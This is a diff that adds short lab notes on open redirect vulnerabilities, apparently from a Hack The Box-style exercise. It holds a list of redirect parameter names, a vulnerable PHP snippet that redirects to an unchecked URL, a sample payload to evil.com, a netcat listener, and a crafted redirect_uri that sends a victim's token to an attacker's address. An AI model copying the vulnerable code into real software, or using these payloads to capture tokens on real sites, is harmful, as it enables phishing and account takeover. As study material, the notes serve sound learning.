@@ -1,0 +1,40 @@
+open redirect parameters:
+
+?url=
+?link=
+?redirect=
+?redirecturl=
+?redirect_uri=
+?return=
+?return_to=
+?returnurl=
+?go=
+?goto=
+?exit=
+?exitpage=
+?fromurl=
+?fromuri=
+?redirect_to=
+?next=
+?newurl=
+?redir=
+========================
+$red = $_GET['url'];
+header("Location: " . $red);
+========================
+$red = $_GET['url'];
+========================
+header("Location: " . $red);
+========================
+trusted.site/index.php?url=https://evil.com
+========================
+/login.php?redirect=dashboard
+========================
+http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+========================
+nc -lvnp 1337
+========================
+http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+========================
+http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+
